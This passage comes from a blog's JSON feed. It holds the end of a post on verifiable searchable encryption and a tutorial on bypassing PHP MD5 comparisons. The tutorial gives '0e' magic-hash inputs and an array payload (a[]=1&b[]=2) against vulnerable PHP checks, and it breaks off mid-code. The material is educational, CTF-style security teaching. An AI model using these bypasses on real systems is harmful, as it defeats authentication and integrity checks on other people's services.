style=\"margin-right:0.03148em;\">k</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord mathnormal\">s</span><span class=\"mord mathnormal\">p</span><span class=\"mord mathnormal\" style=\"margin-right:0.03148em;\">k</span><span class=\"mclose\">)</span></span></span></span> 的概率算法，由数据所有者执行。</li>\n<li><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>I</mi><mi>n</mi><mi>i</mi><mi>t</mi><mo stretchy=\"false\">(</mo><msub><mi>K</mi><mn>1</mn></msub><mo separator=\"true\">,</mo><msub><mi>K</mi><mn>2</mn></msub><mo separator=\"true\">,</mo><msub><mi>K</mi><mn>3</mn></msub><mo separator=\"true\">,</mo><mi>s</mi><mi>s</mi><mi>k</mi><mo separator=\"true\">,</mo><mi>D</mi><mo stretchy=\"false\">)</mo><mo>→</mo><mo stretchy=\"false\">{</mo><mi mathvariant=\"script\">I</mi><mo separator=\"true\">,</mo><mi>π</mi><mo separator=\"true\">,</mo><msub><mi>π</mi><mrow><mi>b</mi><mi>f</mi></mrow></msub><mo separator=\"true\">,</mo><mi mathvariant=\"script\">C</mi><mo stretchy=\"false\">}</mo></mrow><annotation encoding=\"application/x-tex\">Init(K_1,K_2,K_3,ssk,D)\\rightarrow \\{\\mathcal{I},\\pi,\\pi_{bf},\\mathcal{C}\\}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.07847em;\">I</span><span class=\"mord mathnormal\">n</span><span class=\"mord mathnormal\">i</span><span class=\"mord mathnormal\">t</span><span class=\"mopen\">(</span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.07153em;\">K</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">1</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.07153em;\">K</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">2</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.07153em;\">K</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">3</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord mathnormal\">s</span><span class=\"mord mathnormal\">s</span><span class=\"mord mathnormal\" style=\"margin-right:0.03148em;\">k</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">D</span><span class=\"mclose\">)</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">→</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1.036108em;vertical-align:-0.286108em;\"></span><span class=\"mopen\">{</span><span class=\"mord\"><span class=\"mord mathcal\" style=\"margin-right:0.07382em;\">I</span></span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">π</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">π</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.3361079999999999em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">b</span><span class=\"mord mathnormal mtight\" style=\"margin-right:0.10764em;\">f</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.286108em;\"><span></span></span></span></span></span></span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord\"><span class=\"mord mathcal\" style=\"margin-right:0.05834em;\">C</span></span><span class=\"mclose\">}</span></span></span></span>: 一个由数据所有者执行的算法。以私钥<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msub><mi>K</mi><mn>1</mn></msub><mo separator=\"true\">,</mo><msub><mi>K</mi><mn>2</mn></msub><mo separator=\"true\">,</mo><msub><mi>K</mi><mn>3</mn></msub></mrow><annotation encoding=\"application/x-tex\">K_1,K_2,K_3</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8777699999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.07153em;\">K</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">1</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.07153em;\">K</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">2</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.07153em;\">K</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">3</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span>, 签名私钥<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>s</mi><mi>s</mi><mi>k</mi></mrow><annotation encoding=\"application/x-tex\">ssk</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.69444em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">s</span><span class=\"mord mathnormal\">s</span><span class=\"mord mathnormal\" style=\"margin-right:0.03148em;\">k</span></span></span></span> 和文件集<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>D</mi></mrow><annotation encoding=\"application/x-tex\">D</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">D</span></span></span></span> 作为输入，输出安全索引<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi mathvariant=\"script\">I</mi></mrow><annotation encoding=\"application/x-tex\">\\mathcal{I}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord\"><span class=\"mord mathcal\" style=\"margin-right:0.07382em;\">I</span></span></span></span></span>、加密文档<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi mathvariant=\"script\">C</mi></mrow><annotation encoding=\"application/x-tex\">\\mathcal{C}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord\"><span class=\"mord mathcal\" style=\"margin-right:0.05834em;\">C</span></span></span></span></span>、认证器 p 和 Counting Bloom Filter 的认证器<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msub><mi>π</mi><mrow><mi>b</mi><mi>f</mi></mrow></msub></mrow><annotation encoding=\"application/x-tex\">\\pi_{bf}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.716668em;vertical-align:-0.286108em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">π</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.3361079999999999em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">b</span><span class=\"mord mathnormal mtight\" style=\"margin-right:0.10764em;\">f</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.286108em;\"><span></span></span></span></span></span></span></span></span></span>。其中<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msub><mi>π</mi><mrow><mi>b</mi><mi>f</mi></mrow></msub></mrow><annotation encoding=\"application/x-tex\">\\pi_{bf}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.716668em;vertical-align:-0.286108em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">π</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.3361079999999999em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">b</span><span class=\"mord mathnormal mtight\" style=\"margin-right:0.10764em;\">f</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.286108em;\"><span></span></span></span></span></span></span></span></span></span> 是一个认证器，可以在用户查询的关键字不存在时提供证明。数据拥有者将<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi mathvariant=\"script\">I</mi></mrow><annotation encoding=\"application/x-tex\">\\mathcal{I}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord\"><span class=\"mord mathcal\" style=\"margin-right:0.07382em;\">I</span></span></span></span></span> 和<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msub><mi>π</mi><mrow><mi>b</mi><mi>f</mi></mrow></msub></mrow><annotation encoding=\"application/x-tex\">\\pi_{bf}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.716668em;vertical-align:-0.286108em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">π</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.3361079999999999em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">b</span><span class=\"mord mathnormal mtight\" style=\"margin-right:0.10764em;\">f</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.286108em;\"><span></span></span></span></span></span></span></span></span></span> 存储在本地，同时将<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi mathvariant=\"script\">I</mi><mtext>、</mtext><mi mathvariant=\"script\">C</mi><mtext>、</mtext><mi>π</mi></mrow><annotation encoding=\"application/x-tex\">\\mathcal{I}、\\mathcal{C}、\\pi</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord\"><span class=\"mord mathcal\" style=\"margin-right:0.07382em;\">I</span></span><span class=\"mord cjk_fallback\">、</span><span class=\"mord\"><span class=\"mord mathcal\" style=\"margin-right:0.05834em;\">C</span></span><span class=\"mord cjk_fallback\">、</span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">π</span></span></span></span> 和<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msub><mi>π</mi><mrow><mi>b</mi><mi>f</mi></mrow></msub></mrow><annotation encoding=\"application/x-tex\">\\pi_{bf}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.716668em;vertical-align:-0.286108em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">π</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.3361079999999999em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">b</span><span class=\"mord mathnormal mtight\" style=\"margin-right:0.10764em;\">f</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.286108em;\"><span></span></span></span></span></span></span></span></span></span> 发送给云服务器。</li>\n</ul>\n<h2 id=\"the-construction-of-esvsse-esvsse的构建\"><a class=\"anchor\" href=\"#the-construction-of-esvsse-esvsse的构建\">#</a> THE CONSTRUCTION OF ESVSSE ESVSSE 的构建</h2>\n<h3 id=\"building-secure-index-建立安全索引\"><a class=\"anchor\" href=\"#building-secure-index-建立安全索引\">#</a> Building Secure Index 建立安全索引</h3>\n",
            "tags": []
        },
        {
            "id": "http://dpm12345.cn/posts/3dd2cc6f/",
            "url": "http://dpm12345.cn/posts/3dd2cc6f/",
            "title": "Multi-User Verifiable Searchable Symmetric Encryption for Cloud Storage",
            "date_published": "2022-08-10T14:54:40.000Z",
            "content_html": "",
            "tags": []
        },
        {
            "id": "http://dpm12345.cn/posts/558506d6/",
            "url": "http://dpm12345.cn/posts/558506d6/",
            "title": "MD5常见绕过",
            "date_published": "2022-07-23T15:10:32.000Z",
            "content_html": "<h1 id=\"0e-绕过\"><a class=\"anchor\" href=\"#0e-绕过\">#</a> 0e 绕过</h1>\n<p>在弱类型比较时，可利用 md5 值为 0e 进行绕过</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'a'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'b'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'a'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">!==</span> <span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'b'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token function\">md5</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'a'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token function\">md5</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'b'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>        <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"Yes\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token punctuation\">}</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"No\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token punctuation\">}</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"not set\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token punctuation\">}</span></pre></td></tr></tbody></table></figure><p>常见的 MD5 值为  <code>0e</code>  开头的有</p>\n<ul>\n<li>\n<p>QNKCDZO：0e830400451993494058024219903391</p>\n</li>\n<li>\n<p>240610708：0e462097431906509019562988736854</p>\n</li>\n<li>\n<p>0e215962017：0e291242476940776845150308577824</p>\n</li>\n<li>\n<p>s878926199a： 0e545993274517709034328855841020</p>\n</li>\n<li>\n<p>s155964671a： 0e342768416822451524974117254469</p>\n</li>\n<li>\n<p>s214587387a： 0e848240448830537924465865611904</p>\n</li>\n<li>\n<p>s1091221200a： 0e940624217856561557816327384675</p>\n</li>\n<li>\n<p>s1885207154a： 0e509367213418206700842008763514</p>\n</li>\n<li>\n<p>s1502113478a： 0e861580163291561247404381396064</p>\n</li>\n<li>\n<p>s1836677006a： 0e481036490867661113260034900752</p>\n</li>\n<li>\n<p>s1184209335a： 0e072485820392773389523109082030</p>\n</li>\n<li>\n<p>s532378020a： 0e220463095855511507588041205815</p>\n</li>\n<li>\n<p>s109122100a： 0e940624217856561557816327384675</p>\n</li>\n<li>\n<p>s1665632922a： 0e731198061491163073197128363787</p>\n</li>\n</ul>\n<h1 id=\"数组绕过\"><a class=\"anchor\" href=\"#数组绕过\">#</a> 数组绕过</h1>\n<p>当不为弱类型比较时，可以采用数组绕过</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'a'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'b'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'a'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">!==</span> <span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'b'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token function\">md5</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'a'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">===</span> <span class=\"token function\">md5</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'b'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>        <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"Yes\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token punctuation\">}</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"No\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token punctuation\">}</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"not set\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token punctuation\">}</span></pre></td></tr></tbody></table></figure><p>payload 可以为  <code>a[]=1&amp;b[]=2</code></p>\n<p>原因为</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'a'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'b'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token variable\">$a</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'a'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token variable\">$b</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'b'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token function\">var_dump</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token function\">var_dump</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token function\">var_dump</span><span class=\"token punctuation\">(</span><span class=\"token function\">md5</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token function\">var_dump</span><span class=\"token punctuation\">(</span><span class=\"token function\">md5</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token function\">var_dump</span><span class=\"token punctuation\">(</span><span class=\"token function\">md5</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">===</span> <span class=\"token function\">md5</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token punctuation\">}</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token punctuation\">}</span></pre></td></tr></tbody></table></figure><p>上传 POST  <code>a[]=1&amp;b[]=2</code></p>\n<p>得到结果</p>\n<p><img data-src=\"../../post_images/%E5%9B%BE%E7%89%87/md5_cause.jpg\" alt=\"\"></p>\n<p>由此可以知道，当数组作为求 MD5 值对象时，会报错，但是 md5 之后的值为 <code>null</code> ，而 <code>null===null</code>  成立</p>\n<h1 id=\"强类型绕过md5-碰撞\"><a class=\"anchor\" href=\"#强类型绕过md5-碰撞\">#</a> 强类型绕过（MD5 碰撞）</h1>\n<p>如果换成了这个</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'a'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'b'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token 